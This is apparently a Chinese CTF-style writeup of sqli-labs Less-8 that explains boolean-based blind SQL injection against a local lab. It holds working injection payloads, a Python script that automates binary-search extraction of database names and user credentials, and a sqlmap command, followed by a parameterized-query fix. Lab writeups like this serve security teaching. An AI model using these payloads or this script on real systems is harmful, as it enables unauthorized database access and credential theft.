---
layout: post
title: sqli-labs - Less-8 布尔盲注（单引号）Writeup
platform: sqli-labs
date: 2026-11-10 07:50:00 +0800
categories: CTF
---

sqli-labs - Less-8 布尔盲注（单引号）Writeup

一、题目信息

- 平台：sqli-labs（本地搭建）
- 关卡：Less-8 → Blind - Boolean Based（布尔盲注）
- 地址：`http://127.0.0.1:8080/Less-8/?id=1`
- 题型：Web / SQL 注入
- 考点：**布尔盲注：只靠页面「有没有 You are in」判断真假**

**环境信息**：

```text
PHP 7.3.4（php -S 127.0.0.1:8080 内置服务器）
MySQL 5.7.26（secure_file_priv 已设为空，允许 outfile）
sqli-labs 源码：工作区 sqli-labs/
数据库 security（users 表 8 条数据）
```

**✅ 实测结果**

```text
?id=1                     → You are in...........
?id=1'                    → 空白（报错被吞掉）
?id=1' and 1=1 --+        → You are in...........   （真）
?id=1' and 1=2 --+        → 空白                    （假）
?id=1' and length(database())=8 --+        → You are in  ⇒ 库名长度 8
?id=1' and ascii(substr(database(),1,1))=115 --+  → You are in  ⇒ 首字符 's'
?id=1' and ascii(substr(database(),2,1))=101 --+  → You are in  ⇒ 第 2 字符 'e'
```

二、题目分析

**① 源码：错误被 @ 或 null 吞掉，只剩"有没有数据"**

```php
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result = mysql_query($sql);
$row = mysql_fetch_array($result);
if ($row) { echo "You are in..........."; }
else { /* 什么都不输出 */ }
```

**② 和 Less-5 的区别**

```text
Less-5：报错信息会打印（XPATH syntax error: '~xxx'）→ 报错注入
Less-8：错误完全不打印 → 只能通过"页面有没有 You are in"来判断真假 → 布尔盲注
```

**③ 布尔盲注的本质**

```text
把"查数据"变成"问是非题"：
  database() 的第 1 个字符的 ascii 码 是不是 115 ？ → 是 → 页面出现 You are in
                                                    → 否 → 页面空白
一位一位问下去，就能把整个字符串问出来
```

**④ 常用的三个函数**

| 函数 | 作用 | 例子 |
|---|---|---|
| `length(x)` | 字符串长度 | `length(database())=8` |
| `substr(x,i,1)` | 取第 i 个字符 | `substr(database(),1,1)='s'` |
| `ascii(x)` | 转 ascii 码 | `ascii('s')=115` |

**★ 用 ascii 比较比直接比较字符更稳（避免引号和大小写问题）。**

三、解题步骤

**第一步：确认布尔条件可控**

```text
?id=1' and 1=1 --+   → You are in    （真）
?id=1' and 1=2 --+   → 空白          （假）
★ 真假可区分 = 可以盲注
```

**第二步：问库名长度**

```text
?id=1' and length(database())=8 --+   → You are in  ⇒ 长度 8
```

**第三步：逐字符问库名（ascii 二分）**

```text
?id=1' and ascii(substr(database(),1,1))=115 --+   → 真  ⇒ 第 1 字符 's'
?id=1' and ascii(substr(database(),2,1))=101 --+   → 真  ⇒ 第 2 字符 'e'
...
★ 最终得到：security
```

**第四步：爆表名（问子查询）**

```text
?id=1' and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 0,1)=101 --+
```

**第五步：手工太慢 → 上脚本**

```python
# 布尔盲注自动化（简化版）
import requests, string

url = "http://127.0.0.1:8080/Less-8/"
TRUE_MARK = "You are in"

def q(sql):
    payload = f"1' and {sql} --+"
    r = requests.get(url, params={"id": payload}, timeout=10)
    return TRUE_MARK in r.text

def get_str(sql, max_len=64):
    out = ""
    for i in range(1, max_len + 1):
        # 先问长度
        if not q(f"length(({sql})) >= {i}"):
            break
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if q(f"ascii(substr(({sql}),{i},1)) > {mid}"):
                lo = mid + 1
            else:
                hi = mid
        out += chr(lo)
    return out

print("库名:", get_str("select database()"))
print("表名:", get_str("select group_concat(table_name) from information_schema.tables where table_schema=database()"))
print("字段:", get_str("select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'"))
print("账号:", get_str("select group_concat(username,0x3a,password) from users"))
```

**★ 二分法：ascii 范围 32~126，每个字符最多问 7 次（2^7=128），比 95 次线性问快 13 倍。**

四、延伸知识

**① 布尔盲注 vs 时间盲注**

| 类型 | 判断依据 | 适用 | 缺点 |
|---|---|---|---|
| 布尔盲注 | 页面内容差异 | 页面有/无关键字 | 需要能区分内容 |
| 时间盲注 | 响应耗时 | 页面完全一样 | 慢，受网络抖动影响 |

**② 二分法为什么快**

```text
线性：32,33,34,...,126   → 平均问 47 次
二分：64 → 96 → 112 → ...  → 最多 7 次
★ 信息论：每个问题是 1 bit，7 bit 就能确定 128 种可能
```

**③ 加速技巧**

```text
· 用 group_concat 一次取多行，减少往返
· 用 hex() 转十六进制，避免特殊字符编码问题
· 多线程并发（注意别把服务器打挂）
· 直接上 sqlmap：sqlmap -u "http://.../Less-8/?id=1" --technique=B --batch
```

**④ 防御**

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id=? LIMIT 0,1");
$stmt->execute([$id]);
$row = $stmt->fetch();
if ($row) { echo "You are in"; }   // 连"有没有数据"都别泄露太多
```

五、总结

- **本题核心：页面只回显"有没有数据"，用 `and 条件` 构造真假问题，一位一位问出数据。**

- 三步方法论：

```text
① 先找"可区分的差异"：?id=1' and 1=1 有回显，1=2 空白
② 用 length() 问长度，用 ascii(substr()) 问内容
③ 二分法 + 脚本自动化
```

- **三个必记要点**：

```text
① 布尔盲注的关键不是"注"，是"找到能区分真假的信号"
② ascii() 比字符比较稳（避开引号、大小写、编码坑）
③ 二分法把 95 次降成 7 次，脚本必须用二分
```

- **实测数据**：

```text
库名长度 = 8
database() 第 1 字符 ascii = 115 ('s')
database() 第 2 字符 ascii = 101 ('e')
→ security
```

**一句话记忆**：

```
┌──────────────────────────────────────────────────────────────┐
│  Less-8：页面不回显数据 → 把查询变成是非题，一位一位问          │
│                                                              │
│  三件套：                                                     │
│      length(x)            问长度                              │
│      ascii(substr(x,i,1)) 问第 i 个字符                       │
│      二分法                7 次问出一个字符                    │
│                                                              │
│  ★ 找到"真/假可区分"的那个信号，盲注就成立                     │
└──────────────────────────────────────────────────────────────┘
```
